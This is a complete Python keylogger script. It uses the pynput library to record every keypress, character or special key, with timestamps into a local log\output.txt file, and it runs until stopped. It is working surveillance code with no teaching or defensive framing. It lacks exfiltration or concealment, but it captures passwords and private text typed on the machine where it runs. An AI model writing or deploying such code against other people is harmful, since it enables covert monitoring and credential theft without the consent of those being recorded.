import logging
from pynput.keyboard import Key, Listener
import os

# Get the current directory and create a 'log' folder if it doesn't exist
dir = os.getcwd() + "\\log"
if not os.path.exists(dir):
    os.makedirs(dir)

# Create the output.txt file if it doesn't exist
file_path = os.path.join(dir, "output.txt")
if not os.path.isfile(file_path):
    open(file_path, "w").close()

# Configure the logging
logging.basicConfig(filename=file_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Function to log keypresses
def on_press(key):
    try:
        logging.info(key.char)  # Log character keys
    except AttributeError:
        logging.info(str(key))  # Log special keys

# Set the keyboard listener
with Listener(on_press=on_press) as listener:
    listener.join()
